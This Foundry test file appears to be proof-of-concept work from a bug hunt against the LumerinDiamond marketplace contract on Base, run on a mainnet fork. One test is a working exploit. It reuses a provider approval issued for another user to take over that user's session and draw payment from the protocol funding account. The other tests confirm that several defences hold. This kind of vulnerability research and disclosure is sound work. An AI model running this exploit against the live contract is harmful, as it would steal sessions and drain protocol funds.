// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {IDiamond, IERC20Minimal} from "../src/IDiamond.sol";

/// @notice PoCs for the Morpheus LumerinDiamond (Base) marketplace hunt, round 1.
/// Fork of Base mainnet pinned to block 59607993 (2026-11-20).
/// Target: LumerinDiamond 0x6aBE1d282f72B474E54527D93b979A4f64d3030a
/// Source: Morpheus-Lumerin-Node smart-contracts release v7.20.0 (commit
/// 1b0ce5f); the 4 Sourcify-verified facets are byte-identical to that repo,
/// and the SessionRouter facet's 29 on-chain selectors match its interfaces
/// exactly (incl. __SessionRouter_init). SessionRouter has NO verified source
/// on Basescan/Sourcify.
contract MarketplaceDiamondTest is Test {
    IDiamond internal constant DIAMOND = IDiamond(0x6aBE1d282f72B474E54527D93b979A4f64d3030a);
    IERC20Minimal internal constant MOR = IERC20Minimal(0x7431aDa8a591C955a994a21710752EF9b882b8e3);
    address internal constant FUNDING_ACCOUNT = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;
    address internal constant DIAMOND_OWNER = 0x1FE04BC15Cf2c5A2d41a0b3a96725596676eBa1E; // Gnosis Safe 5-of-9

    uint256 internal constant CHAIN_ID = 8453;
    uint256 internal constant PRICE_PER_SECOND = 1e13; // within on-chain [1e10, 1e16]

    uint256 internal providerPk = 0xB0B;
    address internal provider;
    address internal victim = address(0xBEEF);
    address internal attacker = address(0xA77A);

    function setUp() public {
        vm.createSelectFork("https://base.publicnode.com", 59607993);
        provider = vm.addr(providerPk);

        vm.deal(provider, 10 ether);
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);

        deal(address(MOR), provider, 1000 ether);
        deal(address(MOR), victim, 1000 ether);
        deal(address(MOR), attacker, 1000 ether);

        vm.startPrank(provider);
        MOR.approve(address(DIAMOND), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(victim);
        MOR.approve(address(DIAMOND), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker);
        MOR.approve(address(DIAMOND), type(uint256).max);
        vm.stopPrank();
    }

    // ---------- helpers ----------

    /// @dev Register provider + model (owned by provider) + post a bid. Returns (modelId, bidId).
    function _setupMarket(uint256 providerStake) internal returns (bytes32 modelId, bytes32 bidId) {
        vm.startPrank(provider);
        DIAMOND.providerRegister(provider, providerStake, "test.example:1234");
        bytes32 baseModelId = keccak256("test-model");
        modelId = DIAMOND.getModelId(provider, baseModelId);
        string[] memory tags = new string[](0);
        DIAMOND.modelRegister(provider, baseModelId, keccak256("ipfs"), 0, 1 ether, "test-model", tags);
        bidId = DIAMOND.postModelBid(provider, modelId, PRICE_PER_SECOND);
        vm.stopPrank();
    }

    function _ethSignHash(bytes memory data) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(data)));
    }

    /// @dev Provider approval for `user`: abi.encode(bidId, chainId, user, timestamp), eth-signed by provider.
    function _approvalFor(bytes32 bidId, address user, uint128 timestamp)
        internal
        view
        returns (bytes memory approval, bytes memory sig)
    {
        approval = abi.encode(bidId, uint256(CHAIN_ID), user, timestamp);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(providerPk, _ethSignHash(approval));
        sig = abi.encodePacked(r, s, v);
    }

    /// @dev Provider close-out receipt: abi.encode(sessionId, chainId, timestamp, tps, ttft), eth-signed by provider.
    function _receiptFor(bytes32 sessionId, uint128 timestamp, uint256 signerPk)
        internal
        view
        returns (bytes memory receipt, bytes memory sig)
    {
        receipt = abi.encode(sessionId, uint256(CHAIN_ID), timestamp, uint32(1000), uint32(100));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, _ethSignHash(receipt));
        sig = abi.encodePacked(r, s, v);
    }

    function _openAs(address user, uint256 amount, bytes memory approval, bytes memory sig)
        internal
        returns (bytes32 sessionId)
    {
        vm.prank(user);
        sessionId = DIAMOND.openSession(user, amount, false, approval, sig);
    }

    // ---------- CANDIDATE 1 (SUBMITTABLE): approval not bound to user ----------

    /// @notice Provider approval is issued for a specific user (the address is
    /// ABI-encoded into the signed approval), and ISessionRouter even declares
    /// `SessionApprovedForAnotherUser()` — but `_extractProviderApproval`
    /// decodes the address and DISCARDS it, and `_validateSession` never
    /// compares it to `user_`. Anybody holding a (approval, signature) pair
    /// can open a session on that bid as THEMSELVES, burning the one-time
    /// approval. The legitimate user's open then reverts with
    /// SessionDuplicateApproval. In non-direct-payment mode the provider is
    /// paid out of the protocol funding account while the attacker's stake is
    /// returned in full at close: free protocol-funded compute + session theft.
    function test_ApprovalNotBoundToUser() public {
        (bytes32 modelId, bytes32 bidId) = _setupMarket(100 ether);
        assertTrue(DIAMOND.isBidActive(bidId));
        modelId; // silence

        uint256 attackerBalBefore = MOR.balanceOf(attacker);
        uint256 fundingBalBefore = MOR.balanceOf(FUNDING_ACCOUNT);
        uint256 claimedBefore = DIAMOND.getProvidersTotalClaimed();

        // Provider issues an approval for VICTIM only.
        (bytes memory approval, bytes memory sig) = _approvalFor(bidId, victim, uint128(block.timestamp));

        // ATTACKER opens a session with the victim's approval. Must succeed (the bug).
        bytes32 sessionId = _openAs(attacker, 100 ether, approval, sig);
        IDiamond.Session memory session = DIAMOND.getSession(sessionId);
        assertEq(session.user, attacker, "session belongs to attacker, not victim");
        assertTrue(session.isActive);
        assertTrue(DIAMOND.getIsProviderApprovalUsed(approval));

        // VICTIM's own open with the same approval now reverts: session stolen.
        vm.expectRevert(IDiamond.SessionDuplicateApproval.selector);
        _openAs(victim, 100 ether, approval, sig);

        // Let the session run to the end, close it with a valid provider receipt.
        vm.warp(session.endsAt + 1);
        (bytes memory receipt, bytes memory receiptSig) =
            _receiptFor(sessionId, uint128(block.timestamp), providerPk);
        vm.prank(attacker);
        DIAMOND.closeSession(receipt, receiptSig);

        // Attacker's locked stake portion is released the next day.
        uint128 releaseAt = uint128((uint256(session.endsAt) / 1 days) * 1 days) + 1 days;
        vm.warp(uint256(releaseAt) + 1);
        vm.prank(attacker);
        DIAMOND.withdrawUserStakes(attacker, 10);

        uint256 providerReward = DIAMOND.getProvidersTotalClaimed() - claimedBefore;
        console.log("provider reward paid from funding account (MOR wei):", providerReward);
        console.log("funding account MOR lost:", fundingBalBefore - MOR.balanceOf(FUNDING_ACCOUNT));
        console.log("attacker MOR net change (should be 0):", int256(MOR.balanceOf(attacker)) - int256(attackerBalBefore));

        assertGt(providerReward, 0, "provider was paid for the stolen session");
        assertEq(
            fundingBalBefore - MOR.balanceOf(FUNDING_ACCOUNT),
            providerReward,
            "provider reward came out of the funding account"
        );
        assertEq(MOR.balanceOf(attacker), attackerBalBefore, "attacker got their full stake back");
    }

    /// @notice Control test: the intended flow works for the approval's real user.
    function test_NormalSessionFlowWorks() public {
        (, bytes32 bidId) = _setupMarket(100 ether);
        (bytes memory approval, bytes memory sig) = _approvalFor(bidId, victim, uint128(block.timestamp));
        uint256 victimBalBefore = MOR.balanceOf(victim);

        bytes32 sessionId = _openAs(victim, 100 ether, approval, sig);
        assertEq(DIAMOND.getSession(sessionId).user, victim);

        vm.warp(DIAMOND.getSession(sessionId).endsAt + 1);
        (bytes memory receipt, bytes memory receiptSig) =
            _receiptFor(sessionId, uint128(block.timestamp), providerPk);
        vm.prank(victim);
        DIAMOND.closeSession(receipt, receiptSig);

        uint128 releaseAt =
            uint128((uint256(DIAMOND.getSession(sessionId).endsAt) / 1 days) * 1 days) + 1 days;
        vm.warp(uint256(releaseAt) + 1);
        vm.prank(victim);
        DIAMOND.withdrawUserStakes(victim, 10);
        assertEq(MOR.balanceOf(victim), victimBalBefore, "victim stake fully returned");
    }

    // ---------- access control holds (negative tests) ----------

    function test_DiamondCutRevertsForAttacker() public {
        assertEq(DIAMOND.owner(), DIAMOND_OWNER, "owner is the 5-of-9 Safe");
        IDiamond.Facet[] memory facets = new IDiamond.Facet[](1);
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = bytes4(0xdeadbeef);
        facets[0] = IDiamond.Facet({facetAddress: attacker, action: IDiamond.FacetAction.Add, functionSelectors: selectors});
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(IDiamond.OwnableUnauthorizedAccount.selector, attacker));
        DIAMOND.diamondCut(facets, address(0), "");
    }

    function test_InitFunctionsCannotBeReplayed() public {
        IDiamond.Pool[] memory pools = new IDiamond.Pool[](0);
        vm.prank(attacker);
        vm.expectRevert("Initializable: contract is already initialized");
        DIAMOND.__SessionRouter_init(attacker, 604800, pools);

        vm.prank(attacker);
        vm.expectRevert("Initializable: contract is already initialized");
        DIAMOND.__Marketplace_init(attacker, 1, 2);
    }

    // ---------- reward limiter holds (negative test) ----------

    /// @notice Provider claim is capped at stake per 365-day period: a 0.2 MOR
    /// stake cannot claim more than 0.2 MOR even if the session earned ~0.29 MOR.
    function test_ProviderClaimCappedByStake() public {
        (, bytes32 bidId) = _setupMarket(0.2 ether); // minimum stake
        (bytes memory approval, bytes memory sig) = _approvalFor(bidId, victim, uint128(block.timestamp));
        bytes32 sessionId = _openAs(victim, 100 ether, approval, sig);

        uint256 claimedBefore = DIAMOND.getProvidersTotalClaimed();
        vm.warp(DIAMOND.getSession(sessionId).endsAt + 1);
        (bytes memory receipt, bytes memory receiptSig) =
            _receiptFor(sessionId, uint128(block.timestamp), providerPk);
        vm.prank(victim);
        DIAMOND.closeSession(receipt, receiptSig);

        uint256 claimed = DIAMOND.getProvidersTotalClaimed() - claimedBefore;
        console.log("session provider reward (capped at stake):", claimed);
        assertEq(claimed, 0.2 ether, "claim capped at provider stake");

        // A later claim cannot exceed the cap either.
        vm.warp(block.timestamp + 2 days);
        vm.prank(provider);
        DIAMOND.claimForProvider(sessionId);
        assertEq(DIAMOND.getProvidersTotalClaimed() - claimedBefore, 0.2 ether);
    }

    // ---------- dispute path is griefing-only (near-miss) ----------

    /// @notice Closing with a receipt signed by the WRONG key is treated as a
    /// dispute: the provider's pay is held for a day, but it is fully
    /// recoverable via claimForProvider afterwards. Delay only, no loss.
    function test_InvalidReceiptOnlyDelaysProviderPayment() public {
        (, bytes32 bidId) = _setupMarket(100 ether);
        (bytes memory approval, bytes memory sig) = _approvalFor(bidId, victim, uint128(block.timestamp));
        bytes32 sessionId = _openAs(victim, 100 ether, approval, sig);
        IDiamond.Session memory session = DIAMOND.getSession(sessionId);
        uint256 claimedBefore = DIAMOND.getProvidersTotalClaimed();

        // Close EARLY (before endsAt) with a receipt signed by a stranger.
        vm.warp(session.openedAt + 3600);
        (bytes memory receipt, bytes memory receiptSig) =
            _receiptFor(sessionId, uint128(block.timestamp), 0xBAD);
        vm.prank(victim);
        DIAMOND.closeSession(receipt, receiptSig);

        uint256 claimedAtClose = DIAMOND.getProvidersTotalClaimed() - claimedBefore;
        // Full reward for the elapsed time:
        IDiamond.Session memory closed = DIAMOND.getSession(sessionId);
        uint256 expectedFull = (uint256(closed.closedAt) - uint256(closed.openedAt)) * PRICE_PER_SECOND;
        assertLt(claimedAtClose, expectedFull, "part of provider pay held back on dispute");

        // After a day the held part is claimable in full.
        vm.warp(block.timestamp + 2 days);
        vm.prank(provider);
        DIAMOND.claimForProvider(sessionId);
        assertEq(DIAMOND.getProvidersTotalClaimed() - claimedBefore, expectedFull, "provider eventually paid in full");
    }
}
